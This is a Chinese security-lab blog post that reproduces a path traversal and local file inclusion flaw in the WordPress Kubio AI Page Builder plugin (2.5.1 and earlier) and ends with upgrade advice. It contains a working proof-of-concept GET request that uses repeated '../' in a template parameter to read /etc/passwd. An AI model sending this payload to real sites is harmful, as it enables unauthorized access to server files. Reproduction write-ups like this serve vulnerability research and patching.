#  【成功复现】WordPress plugin Kubio AI Page Builder路径遍历漏洞   
弥天安全实验室  弥天安全实验室   2025-05-20 00:20  
  
#   
  
网安引领时代，弥天点亮未来    
   
  
  
  
  
  
   
  
![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
**0x00写在前面**  
  
**本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！**  
0x01漏洞介绍WordPress和WordPress plugin都是WordPress基金会的产品。WordPress是一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。WordPress plugin是一个应用插件。WordPress plugin Kubio AI Page Builder 2.5.1及之前版本存在路径遍历漏洞，该漏洞源于kubio_hybrid_theme_load_template函数存在本地文件包含，可能导致未认证攻击者包含和执行任意文件。0x02影响版本  
WordPress plugin Kubio AI Page Builder 2.5.1及之前版本  
![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hC8oLtqTbR6iawoy29vN0W7VvU9TiazmvSsibJWkZXoP2VkteLqd2uk0ZNXx2KjsGpic1A1rGY5QIL9Vw/640?wx_fmt=png&from=appmsg "")  
  
0x03漏洞复现  
1.访问漏洞环境  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hC8oLtqTbR6iawoy29vN0W7V8hZ9pNChjatqibzOiab4XJeE5lAsspCzfOuu1DzKgyEmtIMFrqMsqhQA/640?wx_fmt=png&from=appmsg "")  
2.对漏洞进行复现 POC 漏洞复现       1.GET请求获取服务器响应，确定使用Kubio AI Page Builder插件       2.执行payload测试漏洞， 通过响应判断漏洞存在。GET /?__kubio-site-edit-iframe-preview=1&__kubio-site-edit-iframe-classic-template=../../../../../../../../etc/passwd HTTP/1.1Host: 127.0.0.13.Yakit插件测试0x04修复建议目前厂商已发布升级补丁以修复漏洞，补丁获取链接：建议尽快升级修复漏洞，再次声明本文仅供学习使用，非法他用责任自负！https://www.wordfence.com/threat-intel/vulnerabilities/id/2fb44c6e-520e-4a9f-9987-8b770feb710d?source=cve弥天简介学海浩茫，予以风动，必降弥天之润！弥天安全实验室成立于2019年2月19日，主要研究安全防守溯源、威胁狩猎、漏洞复现、工具分享等不同领域。目前主要力量为民间白帽子，也是民间组织。主要以技术共享、交流等不断赋能自己，赋能安全圈，为网络安全发展贡献自己的微薄之力。口号 网安引领时代，弥天点亮未来 知识分享完了喜欢别忘了关注我们哦~学海浩茫，予以风动，必降弥天之润！   弥  天安全实验室  
  
